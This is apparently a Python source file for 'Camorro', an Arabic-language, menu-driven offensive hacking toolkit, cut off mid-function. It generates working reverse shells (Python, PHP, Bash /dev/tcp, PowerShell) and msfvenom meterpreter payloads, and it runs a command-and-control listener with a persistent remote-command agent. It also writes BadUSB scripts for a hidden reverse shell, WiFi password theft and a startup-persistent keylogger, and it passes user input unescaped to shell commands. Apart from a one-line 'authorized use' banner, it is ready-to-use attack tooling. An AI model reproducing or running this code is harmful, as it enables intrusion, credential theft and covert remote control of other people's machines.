#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Camorro v1.0 - Advanced Pentesting Framework

import os, sys, socket, subprocess, threading, time, platform, random, requests
from datetime import datetime

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; C = "\033[96m"; W = "\033[97m"
M = "\033[95m"; N = "\033[0m"

BANNER = R + """
 ██████╗ █████╗ ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██████╗ 
██╔════╝██╔══██╗████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██╔══██╗
██║     ███████║██╔████╔██║██║   ██║██████╔╝██████╔╝██████╔╝
██║     ██╔══██║██║╚██╔╝██║██║   ██║██╔══██╗██╔══██╗██╔══██╗
╚██████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║██║  ██║██████╔╝
 ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
""" + Y + """
═══════════════════════════════════════════════════════════════
  Camorro v1.0 - Advanced Pentesting Framework
  لأغراض تعليمية واختبارات مصرح بها فقط
═══════════════════════════════════════════════════════════════
""" + C + """
  التاريخ: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "
  الجهاز: " + platform.system() + " | المستخدم: " + os.getenv('USER', 'root') + "
═══════════════════════════════════════════════════════════════
""" + N


def clear():
    os.system("clear" if os.name == "posix" else "cls")


def print_banner():
    clear()
    print(BANNER)
    print()


def press_enter():
    input(G + "\n[↩] اضغط Enter للعودة..." + N)


def print_main_menu():
    print(C + "╔══════════════════════════════════════════════╗")
    print("║           ♛ قائمة الأدوات الرئيسية ♛         ║")
    print("╠══════════════════════════════════════════════╣")
    print("║                                              ║")
    print("║  " + W + "[1]" + G + "  🔍 جمع المعلومات (OSINT)" + "                " + C + "║")
    print("║  " + W + "[2]" + G + "  📡 فحص الثغرات (Scanner)" + "                 " + C + "║")
    print("║  " + W + "[3]" + G + "  💥 الاستغلال (Exploitation)" + "              " + C + "║")
    print("║  " + W + "[4]" + G + "  🎯 توليد البايلودات (Payloads)" + "            " + C + "║")
    print("║  " + W + "[5]" + G + "  🌐 هجمات الشبكة (Network)" + "                " + C + "║")
    print("║  " + W + "[6]" + G + "  🕵️ الاستطلاع (Reconnaissance)" + "             " + C + "║")
    print("║  " + W + "[7]" + G + "  🌍 فحص الويب (Web Security)" + "               " + C + "║")
    print("║  " + W + "[8]" + G + "  ☠️ نظام التحكم (C2 Framework)" + "             " + C + "║")
    print("║  " + W + "[9]" + G + "  🐬 Flipper Zero / 🦆 Rubber Ducky" + "         " + C + "║")
    print("║  " + W + "[10]" + G + " ⚡ فحص سريع (Quick Scan)" + "                  " + C + "║")
    print("║                                              ║")
    print("║  " + W + "[99]" + R + " ⬆️ تثبيت المتطلبات" + "                       " + C + "║")
    print("║  " + W + "[0]" + R + "  🚪 خروج" + "                                  " + C + "║")
    print("╚══════════════════════════════════════════════╝" + N)
    print()


def osint_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║        🔍 جمع المعلومات (OSINT)           ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " البحث عن بريد إلكتروني")
        print(G + "[2]" + W + " البحث عن اسم مستخدم بالمنصات")
        print(G + "[3]" + W + " معلومات نطاق (Domain)")
        print(G + "[4]" + W + " معلومات IP")
        print(G + "[5]" + W + " فحص DNS كامل")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            email = input(W + "[?] البريد الإلكتروني: " + N).strip()
            if email:
                print(Y + "[*] جاري البحث..." + N)
                try:
                    r = requests.get("https://haveibeenpwned.com/api/v3/breachedaccount/" + email, timeout=10)
                    if r.status_code == 200:
                        for b in r.json():
                            print(R + "[!] اختراق: " + b['Name'] + " - " + b['BreachDate'] + N)
                    else:
                        print(G + "[✓] لا توجد اختراعات" + N)
                except: print(R + "[!] فشل الاتصال" + N)
                print(C + "[+] اسم المستخدم: " + email.split('@')[0] + N)
                print(C + "[+] النطاق: " + email.split('@')[1] + N)
                press_enter()
        elif c == "2":
            user = input(W + "[?] اسم المستخدم: " + N).strip()
            if user:
                print(Y + "[*] جاري البحث..." + N)
                sites = {"GitHub":"https://github.com/" + user,"Twitter":"https://twitter.com/" + user,"Instagram":"https://instagram.com/" + user,"Reddit":"https://reddit.com/user/" + user,"Telegram":"https://t.me/" + user,"YouTube":"https://youtube.com/@" + user,"TikTok":"https://tiktok.com/@" + user,"Pinterest":"https://pinterest.com/" + user,"Medium":"https://medium.com/@" + user,"Dev.to":"https://dev.to/" + user,"Keybase":"https://keybase.io/" + user,"Replit":"https://replit.com/@" + user}
                found = 0
                for name, url in sites.items():
                    try:
                        r = requests.get(url, timeout=5, headers={'User-Agent': 'Mozilla/5.0'})
                        if r.status_code == 200: print(G + "[✓] " + name + ": " + url + N); found += 1
                        else: print(C + "[-] " + name + ": غير موجود" + N)
                    except: print(Y + "[?] " + name + ": فشل" + N)
                print(W + "[+] تم العثور على " + str(found) + " حساب" + N)
                press_enter()
        elif c == "3":
            domain = input(W + "[?] النطاق: " + N).strip()
            if domain:
                try:
                    ip = socket.gethostbyname(domain)
                    print(G + "[+] IP: " + ip + N)
                    r = requests.get("https://ipinfo.io/" + ip + "/json", timeout=5)
                    d = r.json()
                    print(C + "[+] المدينة: " + d.get('city','') + N)
                    print(C + "[+] المنطقة: " + d.get('region','') + N)
                    print(C + "[+] الدولة: " + d.get('country','') + N)
                    print(C + "[+] المزود: " + d.get('org','') + N)
                except: print(R + "[!] فشل" + N)
                press_enter()
        elif c == "4":
            ip = input(W + "[?] عنوان IP: " + N).strip()
            if ip:
                try:
                    r = requests.get("https://ipinfo.io/" + ip + "/json", timeout=5)
                    d = r.json()
                    for k in ['ip','hostname','city','region','country','org','loc','timezone','postal']:
                        print(C + "[+] " + k + ": " + d.get(k, 'غير معروف') + N)
                except: print(R + "[!] فشل" + N)
                press_enter()
        elif c == "5":
            domain = input(W + "[?] النطاق: " + N).strip()
            if domain:
                print(Y + "[*] فحص DNS..." + N)
                for rtype in ['A','AAAA','MX','NS','TXT','SOA','CNAME']:
                    try:
                        import dns.resolver
                        answers = dns.resolver.resolve(domain, rtype)
                        for a in answers: print(G + "[+] " + rtype + ": " + str(a) + N)
                    except: print(C + "[-] " + rtype + ": غير موجود" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def scanner_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║         📡 فحص الثغرات (Scanner)           ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " فحص المنافذ (Nmap -sV -sC)")
        print(G + "[2]" + W + " فحص سريع للمنافذ الشائعة")
        print(G + "[3]" + W + " فحص الثغرات (Nuclei)")
        print(G + "[4]" + W + " فحص SQL Injection")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            target = input(W + "[?] الهدف: " + N).strip()
            if target:
                print(Y + "[*] فحص " + target + "..." + N)
                try:
                    r = subprocess.run(["nmap","-sV","-sC","-T4",target], capture_output=True, text=True, timeout=300)
                    print(G + r.stdout + N)
                except: print(R + "[!] خطأ" + N)
                press_enter()
        elif c == "2":
            target = input(W + "[?] الهدف: " + N).strip()
            if target:
                ports = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5900:"VNC",6379:"Redis",8080:"HTTP-Proxy",8443:"HTTPS-Alt",27017:"MongoDB"}
                open_ports = []
                for port, svc in ports.items():
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    try:
                        if s.connect_ex((socket.gethostbyname(target), port)) == 0:
                            open_ports.append((port, svc))
                            print(G + "[✓] " + str(port) + "/" + svc + " مفتوح" + N)
                    except: pass
                    finally: s.close()
                if not open_ports: print(C + "[-] لا توجد منافذ مفتوحة" + N)
                print(W + "[+] المجموع: " + str(len(open_ports)) + N)
                press_enter()
        elif c == "3":
            target = input(W + "[?] URL: " + N).strip()
            if target:
                try:
                    r = subprocess.run(["nuclei","-u",target,"-severity","low,medium,high,critical"], capture_output=True, text=True, timeout=300)
                    print(G + (r.stdout or "[-] لا توجد نتائج") + N)
                except: print(R + "[!] Nuclei غير مثبت" + N)
                press_enter()
        elif c == "4":
            url = input(W + "[?] URL (مع parameter): " + N).strip()
            if url:
                from urllib.parse import quote
                payloads = ["'","''","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1"]
                found = False
                for p in payloads:
                    try:
                        r = requests.get(url + quote(p), timeout=5)
                        if any(e in r.text.lower() for e in ["sql","mysql","warning","unclosed","syntax","odbc"]):
                            print(R + "[!] SQL Injection محتمل: " + p + N)
                            found = True; break
                    except: pass
                if not found: print(G + "[✓] لا يوجد SQL Injection واضح" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def exploit_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║        💥 الاستغلال (Exploitation)          ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " تشغيل Metasploit Console")
        print(G + "[2]" + W + " توليد Python Reverse Shell")
        print(G + "[3]" + W + " توليد PHP Web Shell")
        print(G + "[4]" + W + " توليد Bash Reverse Shell")
        print(G + "[5]" + W + " توليد PowerShell Reverse Shell")
        print(G + "[6]" + W + " البحث عن Exploit (Searchsploit)")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1": os.system("msfconsole -q")
        elif c in ["2","3","4","5"]:
            lhost = input(W + "[?] LHOST: " + N).strip()
            lport = input(W + "[?] LPORT: " + N).strip()
            if lhost and lport:
                shells = {
                    "2": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + lhost + "\"," + lport + "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                    "3": "<?php $ip=\"" + lhost + "\";$port=" + lport + ";$s=fsockopen($ip,$port);$p=proc_open(\"/bin/sh -i\",array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);?>",
                    "4": "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
                    "5": "$client=New-Object Net.Sockets.TCPClient('" + lhost + "'," + lport + ");$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
                }
                print(G + "\n[+] البايلود:\n" + N + Y + shells[c] + N)
                fname = "shell_" + c + "_" + lport + ".txt"
                with open(fname,"w") as f: f.write(shells[c])
                print(G + "[✓] حفظ في: " + fname + N)
                press_enter()
        elif c == "6":
            cve = input(W + "[?] CVE ID: " + N).strip()
            if cve:
                try:
                    r = subprocess.run(["searchsploit",cve], capture_output=True, text=True, timeout=30)
                    print(G + (r.stdout or "[-] لا توجد نتائج") + N)
                except: print(R + "[!] searchsploit غير مثبت" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def payload_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║       🎯 توليد البايلودات (Payloads)        ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " توليد بايلودات MSFVenom")
        print(G + "[2]" + W + " توليد Web Shell (PHP)")
        print(G + "[3]" + W + " توليد Android APK")
        print(G + "[4]" + W + " توليد جميع البايلودات دفعة واحدة")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c in ["1","3","4"]:
            lhost = input(W + "[?] LHOST: " + N).strip()
            lport = input(W + "[?] LPORT: " + N).strip()
            if lhost and lport:
                cmds = [
                    "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f elf -o camorro_linux_" + lport + ".elf",
                    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f exe -o camorro_windows_" + lport + ".exe",
                    "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -f macho -o camorro_macos_" + lport + ".macho",
                    "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " -o camorro_android_" + lport + ".apk"
                ]
                if c == "1": cmds = cmds[:2]
                elif c == "3": cmds = [cmds[3]]
                for cmd in cmds:
                    print(C + "[*] " + cmd + N)
                    subprocess.run(cmd, shell=True, timeout=120)
                print(G + "[✓] تم التوليد!" + N)
                press_enter()
        elif c == "2":
            lhost = input(W + "[?] LHOST: " + N).strip()
            lport = input(W + "[?] LPORT: " + N).strip()
            if lhost and lport:
                php = "<?php $ip='" + lhost + "';$port=" + lport + ";$s=fsockopen($ip,$port);$p=proc_open('/bin/sh -i',array(0=>$s,1=>$s,2=>$s),$pipes);proc_close($p);?>"
                with open("webshell_" + lport + ".php","w") as f: f.write(php)
                print(G + "[✓] webshell_" + lport + ".php" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def network_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║         🌐 هجمات الشبكة (Network)           ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " مسح الشبكة (Nmap -sn)")
        print(G + "[2]" + W + " فحص أجهزة الشبكة (NetDiscover)")
        print(G + "[3]" + W + " اعتراض حزم (TCPDump)")
        print(G + "[4]" + W + " تغيير MAC Address")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            net = input(W + "[?] نطاق الشبكة: " + N).strip()
            if net: os.system("nmap -sn " + net); press_enter()
        elif c == "2":
            net = input(W + "[?] نطاق الشبكة: " + N).strip() or "192.168.1.0/24"
            os.system("netdiscover -r " + net); press_enter()
        elif c == "3":
            iface = input(W + "[?] الواجهة (wlan0): " + N).strip() or "wlan0"
            try: subprocess.run(["tcpdump","-i",iface,"-c","30","-nn"], timeout=20)
            except: print(G + "[✓] تم التسجيل" + N)
            press_enter()
        elif c == "4":
            iface = input(W + "[?] الواجهة: " + N).strip() or "wlan0"
            new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.randint(0,255) for _ in range(5))
            try:
                subprocess.run(["ip","link","set",iface,"down"], check=True)
                subprocess.run(["ip","link","set",iface,"address",new_mac], check=True)
                subprocess.run(["ip","link","set",iface,"up"], check=True)
                print(G + "[✓] تم تغيير MAC إلى " + new_mac + N)
            except: print(R + "[!] فشل" + N)
            press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def recon_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║       🕵️ الاستطلاع (Reconnaissance)         ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " جمع النطاقات الفرعية")
        print(G + "[2]" + W + " فحص DNS كامل")
        print(G + "[3]" + W + " كشف تقنيات الموقع")
        print(G + "[4]" + W + " جلب URLs من Wayback Machine")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            domain = input(W + "[?] النطاق: " + N).strip()
            if domain:
                subs = ["www","mail","ftp","admin","api","blog","dev","test","vpn","portal","cpanel","webmail","support","ssh","mysql","db","backup","beta","app","cdn","static","forum","wiki","docs","git","jenkins","proxy","sso","auth","login","register","shop","store","remote","server","cloud","ns1","ns2","mx1","mx2","dns","gateway","router","firewall","waf","office","hq"]
                found = []
                for s in subs:
                    try:
                        ip = socket.gethostbyname(s + "." + domain)
                        found.append((s, ip))
                        print(G + "[✓] " + s + "." + domain + " -> " + ip + N)
                    except: pass
                print(W + "\n[+] تم العثور على " + str(len(found)) + " نطاق فرعي" + N)
                with open("subdomains_" + domain + ".txt","w") as f:
                    for s,ip in found: f.write(s + "." + domain + "," + ip + "\n")
                print(G + "[✓] حفظ في subdomains_" + domain + ".txt" + N)
                press_enter()
        elif c == "2":
            domain = input(W + "[?] النطاق: " + N).strip()
            if domain:
                for rtype in ['A','AAAA','MX','NS','TXT','SOA','CNAME']:
                    try:
                        import dns.resolver
                        answers = dns.resolver.resolve(domain, rtype)
                        for a in answers: print(G + "[+] " + rtype + ": " + str(a) + N)
                    except: print(C + "[-] " + rtype + ": غير موجود" + N)
                press_enter()
        elif c == "3":
            url = input(W + "[?] الرابط: " + N).strip()
            if url:
                try:
                    r = requests.get(url, timeout=10, headers={'User-Agent':'Mozilla/5.0'})
                    print(G + "[+] Server: " + r.headers.get('Server','N/A') + N)
                    print(G + "[+] X-Powered-By: " + r.headers.get('X-Powered-By','N/A') + N)
                    for h in ['Strict-Transport-Security','X-Frame-Options','X-XSS-Protection','X-Content-Type-Options','Content-Security-Policy']:
                        if h in r.headers: print(G + "[✓] " + h + N)
                        else: print(R + "[✗] " + h + " - غير موجود (خطر)" + N)
                    if 'wp-content' in r.text: print(Y + "[!] WordPress" + N)
                    if 'Joomla' in r.text[:2000]: print(Y + "[!] Joomla" + N)
                except: print(R + "[!] فشل" + N)
                press_enter()
        elif c == "4":
            domain = input(W + "[?] النطاق: " + N).strip()
            if domain:
                try:
                    r = requests.get("http://web.archive.org/cdx/search/cdx?url=" + domain + "/*&output=json&fl=original&collapse=urlkey", timeout=15)
                    if r.status_code == 200:
                        data = r.json()
                        print(G + "[+] " + str(len(data)) + " URL مخزّن" + N)
                        interesting = []
                        for item in data[1:31]:
                            u = item[0] if isinstance(item,list) else str(item)
                            if any(k in u.lower() for k in ['admin','login','api','config','backup','sql','db','password','secret','key','token']):
                                interesting.append(u)
                                print(R + "[!] " + u + N)
                        with open("wayback_" + domain + ".txt","w") as f:
                            for u in interesting: f.write(u + "\n")
                        print(G + "[✓] حفظ " + str(len(interesting)) + " URL" + N)
                except: print(R + "[!] فشل" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def web_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║        🌍 فحص أمان الويب (Web Security)     ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " فحص إعدادات الأمان (Security Headers)")
        print(G + "[2]" + W + " اكتشاف المسارات (Directory Busting)")
        print(G + "[3]" + W + " فحص SQL Injection")
        print(G + "[4]" + W + " فحص XSS")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            url = input(W + "[?] الرابط: " + N).strip()
            if url:
                try:
                    r = requests.get(url, timeout=10)
                    for h,desc in {'Strict-Transport-Security':'HSTS','X-Frame-Options':'Clickjacking','X-Content-Type-Options':'MIME Sniffing','Content-Security-Policy':'CSP','X-XSS-Protection':'XSS'}.items():
                        if h in r.headers: print(G + "[✓] " + h + " (" + desc + ")" + N)
                        else: print(R + "[✗] " + h + " (" + desc + ") - غير موجود" + N)
                except: print(R + "[!] فشل" + N)
                press_enter()
        elif c == "2":
            url = input(W + "[?] الرابط: " + N).strip()
            if url:
                paths = ["/admin","/login","/wp-admin","/administrator","/backup","/config","/config.php","/db","/database","/sql","/mysql","/phpmyadmin","/manager","/panel","/cpanel","/api","/v1","/v2","/api/v1","/api/users","/api/login","/uploads","/files","/images","/assets","/robots.txt","/sitemap.xml","/.env","/.git","/.git/config","/.htaccess","/.htpasswd","/server-status","/info.php","/test","/debug","/error","/log","/logs","/shell","/cmd","/exec","/console","/terminal","/webmail","/xmlrpc.php","/wp-cron.php","/crossdomain.xml"]
                found = []
                for p in paths:
                    try:
                        r = requests.get(url.rstrip('/') + p, timeout=3, headers={'User-Agent':'Camorro Scanner'})
                        if r.status_code in [200,201,301,302,403,401]:
                            c2 = G if r.status_code == 200 else Y
                            print(c2 + "[" + str(r.status_code) + "] " + p + N)
                            found.append((p, r.status_code))
                    except: pass
                print(W + "[+] " + str(len(found)) + " مسار" + N)
                if found:
                    with open("dirs_" + url.replace('https://','').replace('http://','').replace('/','_') + ".txt","w") as f:
                        for p,code in found: f.write(p + " [" + str(code) + "]\n")
                    print(G + "[✓] حفظ النتائج" + N)
                press_enter()
        elif c == "3":
            url = input(W + "[?] URL مع parameter: " + N).strip()
            if url:
                from urllib.parse import quote
                for p in ["'","''","' OR '1'='1","' OR 1=1--","\" OR \"1\"=\"1"]:
                    try:
                        r = requests.get(url + quote(p), timeout=5)
                        if any(e in r.text.lower() for e in ["sql","mysql","warning","unclosed","syntax","odbc"]):
                            print(R + "[!] SQL Injection: " + p + N); break
                    except: pass
                else: print(G + "[✓] لا يوجد SQL Injection" + N)
                press_enter()
        elif c == "4":
            url = input(W + "[?] URL مع parameter: " + N).strip()
            if url:
                from urllib.parse import quote
                for p in ["<script>alert(1)</script>","\"><script>alert(1)</script>","<img src=x onerror=alert(1)>"]:
                    try:
                        r = requests.get(url + quote(p), timeout=5)
                        if p in r.text: print(R + "[!] XSS: " + p + N); break
                    except: pass
                else: print(G + "[✓] لا يوجد XSS واضح" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


c2_sessions = {}
c2_running = False


def c2_listener(host, port):
    global c2_running, c2_sessions
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(5)
        server.settimeout(1)
        c2_running = True
        print(G + "[✓] Listener على " + host + ":" + str(port) + N)
        while c2_running:
            try:
                client, addr = server.accept()
                sid = len(c2_sessions) + 1
                c2_sessions[sid] = {'socket':client,'address':addr,'time':time.strftime('%H:%M:%S')}
                print(G + "\n[+] جلسة #" + str(sid) + " من " + addr[0] + ":" + str(addr[1]) + N)
                try:
                    client.send(b"id\n")
                    r1 = client.recv(4096).decode(errors='replace').strip()
                    client.send(b"hostname\n")
                    r2 = client.recv(4096).decode(errors='replace').strip()
                    c2_sessions[sid]['user'] = r1
                    c2_sessions[sid]['hostname'] = r2
                    print(C + "    المستخدم: " + r1 + N)
                    print(C + "    المضيف: " + r2 + N)
                except: pass
            except socket.timeout: continue
        server.close()
    except Exception as e:
        print(R + "[!] " + str(e) + N)
        c2_running = False


def c2_menu():
    global c2_running
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║        ☠️ C2 Command & Control              ║")
        print("╚══════════════════════════════════════════╝" + N)
        print(W + "\nحالة Listener: " + (G + "[نشط]" if c2_running else R + "[متوقف]") + N)
        print(C + "الجلسات: " + str(len(c2_sessions)) + N)
        print()
        print(G + "[1]" + W + " تشغيل Listener")
        print(G + "[2]" + W + " إيقاف Listener")
        print(G + "[3]" + W + " عرض الجلسات")
        print(G + "[4]" + W + " التفاعل مع جلسة")
        print(G + "[5]" + W + " توليد Agent (Python)")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            if c2_running: print(Y + "[!] قيد التشغيل" + N); press_enter(); continue
            host = input(W + "[?] IP [0.0.0.0]: " + N).strip() or "0.0.0.0"
            port = int(input(W + "[?] Port [4444]: " + N).strip() or "4444")
            t = threading.Thread(target=c2_listener, args=(host,port), daemon=True)
            t.start()
            print(G + "[✓] Listener يعمل" + N)
            press_enter()
        elif c == "2":
            c2_running = False
            print(G + "[✓] تم الإيقاف" + N)
            press_enter()
        elif c == "3":
            if not c2_sessions: print(Y + "[!] لا توجد جلسات" + N)
            else:
                for sid, s in c2_sessions.items():
                    print(G + "[" + str(sid) + "] " + s['address'][0] + ":" + str(s['address'][1]) + " @ " + s['time'] + N)
            press_enter()
        elif c == "4":
            if not c2_sessions: print(Y + "[!] لا توجد جلسات" + N); press_enter(); continue
            sid = int(input(W + "[?] رقم الجلسة: " + N).strip())
            if sid not in c2_sessions: print(R + "[!] غير موجودة" + N); press_enter(); continue
            sock = c2_sessions[sid]['socket']
            print(G + "[*] جلسة " + str(sid) + " - اكتب exit للخروج" + N)
            while True:
                try:
                    cmd = input(R + "C2[" + str(sid) + "]> " + N).strip()
                    if cmd.lower() == 'exit': break
                    if not cmd: continue
                    sock.send((cmd + "\n").encode())
                    time.sleep(0.5)
                    sock.settimeout(3)
                    while True:
                        try:
                            data = sock.recv(4096)
                            if not data: break
                            print(data.decode(errors='replace'), end='')
                        except socket.timeout: break
                except:
                    print(R + "[!] انقطع الاتصال" + N)
                    del c2_sessions[sid]; break
            press_enter()
        elif c == "5":
            lhost = input(W + "[?] LHOST: " + N).strip()
            lport = input(W + "[?] LPORT: " + N).strip()
            if lhost and lport:
                code = '#!/usr/bin/env python3\nimport socket,subprocess,os,platform,time\ndef c():\n s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n s.connect(("' + lhost + '",' + lport + '))\n s.send(("[+] Camorro Agent\\nOS: "+platform.system()+"\\nHost: "+platform.node()+"\\n").encode())\n while True:\n  try:\n   d=s.recv(4096).decode().strip()\n   if not d or d.lower()=="exit": break\n   r=subprocess.run(d,shell=True,capture_output=True,text=True,timeout=30)\n   s.send((r.stdout+r.stderr).encode())\n  except: break\n s.close()\nwhile True:\n try: c()\n except: time.sleep(5)'
                with open("agent_" + lport + ".py","w") as f: f.write(code)
                print(G + "[✓] agent_" + lport + ".py" + N)
                press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def flipper_menu():
    while True:
        clear(); print_banner()
        print(C + "╔══════════════════════════════════════════╗")
        print("║   🐬 Flipper Zero / 🦆 Rubber Ducky        ║")
        print("╚══════════════════════════════════════════╝" + N)
        print()
        print(G + "[1]" + W + " توليد BadUSB Script (Reverse Shell)")
        print(G + "[2]" + W + " توليد Ducky Script (WiFi Stealer)")
        print(G + "[3]" + W + " توليد Ducky Script (Keylogger)")
        print(R + "[0]" + W + " العودة")
        print()
        c = input(G + "╰➤ " + Y + "اختر: " + N).strip()
        if c == "0": break
        elif c == "1":
            ip = input(W + "[?] IP: " + N).strip()
            port = input(W + "[?] Port: " + N).strip()
            if ip and port:
                s = 'REM Camorro BadUSB - Reverse Shell\nDEFAULTDELAY 50\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object Net.Sockets.TCPClient(\'' + ip + '\',' + port + ');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\'PS> \';$sbb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbb,0,$sbb.Length);$s.Flush()};$c.Close()"\nENTER'
                with open("badusb_reverse_" + port + ".txt","w") as f: f.write(s)
                print(G + "[✓] badusb_reverse_" + port + ".txt" + N)
                press_enter()
        elif c == "2":
            s = 'REM Camorro Ducky - WiFi Stealer\nDEFAULTDELAY 50\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$p=netsh wlan show profiles|Select-String \': \'|%{$_.ToString().Split(\':\')[1].Trim()};foreach($x in $p){$k=netsh wlan show profile name=\'"$x"\' key=clear|Select-String \'Key Content\';if($k){$x+\':\'+$k.ToString().Split(\':\')[2].Trim()}|Out-File $env:TEMP\\wifi.txt -Append}"\nENTER'
            with open("ducky_wifi_stealer.txt","w") as f: f.write(s)
            print(G + "[✓] ducky_wifi_stealer.txt" + N)
            press_enter()
        elif c == "3":
            s = 'REM Camorro Ducky - Keylogger\nDEFAULTDELAY 50\nDELAY 2000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$k=@\'$w=New-Object -ComObject WScript.Shell;$p=\'$env:TEMP\\key.log\';while(1){Start-Sleep -Seconds 10;$d=(Get-Date).ToString(\'HH:mm:ss\');Add-Content $p \"[$d] Key pressed\"}\'@;Out-File $env:APPDATA\\keylogger.ps1 -InputObject $k;$s=(New-Object -ComObject WScript.Shell).CreateShortcut(\'$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\keylogger.lnk\');$s.TargetPath=\'powershell.exe\';$s.Arguments=\'-NoP -NonI -W Hidden -Exec Bypass -File $env:APPDATA\\keylogger.ps1\';$s.Save()"\nENTER'
            with open("ducky_keylogger.txt","w") as f: f.write(s)
            print(G + "[✓] ducky_keylogger.txt" + N)
            press_enter()
        else: print(R + "[!] خيار غير صحيح" + N); press_enter()


def quick_scan():
    clear(); print_banner()
    print(C + "╔══════════════════════════════════════════╗")
    print("║         ⚡ فحص سريع (Quick Scan)            ║")
    print("╚══════════════════════════════════════════╝" + N)
    target = input(W + "\n[?] الهدف: " + N).strip()
    if not target: return
    print(Y + "[*] فحص " + target + "..." + N)
    try:
